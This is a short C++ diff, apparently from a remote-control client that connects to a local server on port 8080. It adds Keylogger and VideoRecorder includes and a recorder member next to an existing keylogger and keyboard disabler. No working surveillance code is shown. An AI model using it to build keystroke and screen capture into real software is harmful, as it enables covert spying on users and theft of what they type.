@@ -14,6 +14,8 @@
 
 #include "./../WindowAPI/winAPI.hpp"
 #include "./../WindowAPI/KeyboardDisabler.hpp"
+#include "./../WindowAPI/Keylogger.hpp"
+#include "./../WindowAPI/VideoRecorder.hpp"
 
 #define PORT 8080
 #define SERVER_IP "127.0.0.1"
@@ -62,6 +64,8 @@ private:
     WinAPI *winAPI;
 
     Keylogger *keylogger;
+
+    VideoRecorder *recorder;
 
     KeyboardDisabler *keyboardDisabler;
 
